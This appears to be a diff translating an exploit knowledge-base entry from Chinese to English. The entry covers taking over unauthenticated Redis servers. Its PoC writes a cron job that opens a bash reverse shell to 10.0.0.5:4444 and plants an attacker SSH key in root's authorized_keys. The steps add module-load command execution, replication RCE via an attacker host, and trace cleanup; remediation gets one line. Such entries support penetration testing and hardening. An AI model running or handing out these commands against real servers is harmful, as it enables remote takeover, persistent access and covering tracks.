@@ -1,62 +1,62 @@
 ---
-title: Redis 未授权（写文件 / 模块加载 / 主从复制）
-cve: 无单一 CVE（CVE-2022-0543 为 Debian 特例）
+title: Redis Unauthenticated (File Write / Module Load / Master-Slave Replication)
+cve: No single CVE (CVE-2022-0543 is a Debian special case)
 severity: critical
 cvss: 9.8
 product: Redis
-versions: 任意（无认证 + 暴露）
+versions: Any (no auth + exposed)
 ports: 6379, 6380
 keywords: redis, unauth, config-set, rdb, cron, module-load, replica
 verified: false
-sources: 公开资料整理（业务逻辑 / 实现 / 配置缺陷类，无 CVE；出处见文末参考）
+sources: Compiled from public sources (business-logic / implementation / misconfiguration classes, no CVE; see references below)
 ---
 
-## 指纹
+## Fingerprint
 
 ```bash
 redis-cli -h target -p 6379 INFO
 redis-cli -h target -p 6379 CONFIG GET dir
 ```
 
-返回 `redis_version` 即未授权。
+Returning `redis_version` means unauthenticated.
 
-## 前置条件
+## Prerequisites
 
-- 6379 可达且 `requirepass` 为空；Redis 进程用户对目标目录可写。
+- 6379 reachable and `requirepass` empty; the Redis process user can write to the target directory.
 
 ## PoC
 
 ```bash
-# 1) 判定
+# 1) Check
 redis-cli -h target CONFIG GET dir
 redis-cli -h target CONFIG GET dbfilename
 
-# 2) 写 crontab（Linux）
+# 2) Write a crontab (Linux)
 redis-cli -h target CONFIG SET dir /var/spool/cron/
 redis-cli -h target CONFIG SET dbfilename root
 redis-cli -h target SET x "\n\n*/1 * * * * bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n\n"
 redis-cli -h target SAVE
 
-# 3) 写 SSH key
+# 3) Write an SSH key
 redis-cli -h target CONFIG SET dir /root/.ssh/
 redis-cli -h target CONFIG SET dbfilename authorized_keys
 redis-cli -h target SET x "\n\nssh-rsa AAAA... \n\n"
 redis-cli -h target SAVE
 ```
 
-## 利用步骤
+## Exploitation steps
 
-1. `INFO` 确认版本与 `CONFIG` 可用（部分版本禁用 `CONFIG` 时走 `SLAVEOF`/`MODULE`）。
-2. 写文件前先 `CONFIG GET dir` 确认可写目录；`SAVE` 后验证文件（`redis-cli GET` 或直接读）。
-3. Windows 目标：写 `C:\Windows\Temp\` 下的启动项或 `C:\Users\<u>\.ssh\authorized_keys`。
-4. 加载模块（4.x+）：`MODULE LOAD /path/exp.so` → `system.exec 'id'`（RedisModules-ExecuteCommand）。
-5. 主从复制 RCE：`SLAVEOF attacker 6379` + `MODULE LOAD`，在不出网写文件受限时最稳。
-6. 清理：`CONFIG SET dir /tmp` 恢复、删写入的文件、`MODULE UNLOAD`。
+1. Use `INFO` to confirm the version and that `CONFIG` is available (when some versions disable `CONFIG`, use `SLAVEOF`/`MODULE`).
+2. Before writing files, run `CONFIG GET dir` to confirm a writable directory; after `SAVE`, verify the file (`redis-cli GET` or read it directly).
+3. Windows targets: write a startup item under `C:\Windows\Temp\` or `C:\Users\<u>\.ssh\authorized_keys`.
+4. Load a module (4.x+): `MODULE LOAD /path/exp.so` → `system.exec 'id'` (RedisModules-ExecuteCommand).
+5. Master-slave replication RCE: `SLAVEOF attacker 6379` + `MODULE LOAD`, the most reliable option when outbound connectivity is unavailable and file writes are restricted.
+6. Cleanup: restore with `CONFIG SET dir /tmp`, delete written files, `MODULE UNLOAD`.
 
-## 修复与缓解
+## Remediation and mitigation
 
-- 设 `requirepass` + `rename-command CONFIG ""`；6379 只对内网；`protected-mode yes` 且不绑 0.0.0.0。
+- Set `requirepass` + `rename-command CONFIG ""`; keep 6379 internal-only; `protected-mode yes` and do not bind 0.0.0.0.
 
-## 参考
+## References
 
-- Redis 安全建议；CVE-2022-0543（Debian 打包的 Lua 沙箱逃逸）。
+- Redis security recommendations; CVE-2022-0543 (Lua sandbox escape in Debian packaging).
